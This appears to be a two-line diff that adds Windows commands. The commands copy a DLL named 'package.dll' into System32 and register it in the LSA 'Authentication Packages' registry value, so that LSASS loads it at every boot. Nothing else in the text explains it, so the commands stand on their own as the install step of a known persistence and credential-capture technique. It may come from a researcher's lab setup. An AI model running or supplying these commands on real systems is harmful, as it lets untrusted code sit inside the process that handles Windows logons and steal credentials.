@@ -1,0 +1,2 @@
+Copy-Item "C:\Users\msi\Desktop\Xteam-Reseacher\dailywekken\Setup\package.dll" C:\Windows\System32\
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
